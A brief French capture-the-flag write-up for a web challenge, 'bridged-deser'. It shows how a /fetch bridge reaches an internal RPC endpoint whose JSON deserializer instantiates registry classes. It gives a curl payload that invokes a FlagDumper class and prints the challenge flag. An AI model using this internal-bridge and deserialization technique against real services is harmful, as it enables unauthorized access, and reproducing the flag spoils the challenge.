# bridged-deser (web / deserialization, id 293)

**Flag (finale) :** `NCTF{53229fb635cde50c21761717}`

## Contexte
`/` : `{"fetch":"/fetch?url=<path>&body=<json>","note":"internal RPC is not reachable directly"}`.
Le bridge /fetch relaie vers un RPC interne ; `body` (JSON) y est désérialisé.

## Découverte
- `/fetch?url=/status` → `{"status":"ok"}` (path RPC valide, ignore body).
- Fuzz des paths → **`/internal/rpc`** → `{"result":"record: "}` (déséralise body).
- `body={"__class__":"X"}` → `{"error":"unknown class","registry":["FlagDumper","Record"]}`
  → la déser instancie des classes via `__class__` depuis une **registry** (JSON→objet).

## Exploitation
```bash
curl -sG $B/fetch --data-urlencode url=/internal/rpc \
  --data-urlencode 'body={"__class__":"FlagDumper"}'
# {"result":"NCTF{...}"}
```
Instancier la classe `FlagDumper` enregistrée dump le flag.

## Note
Déséralisation "safe-list" mal conçue : la registry contient une classe dangereuse (FlagDumper).
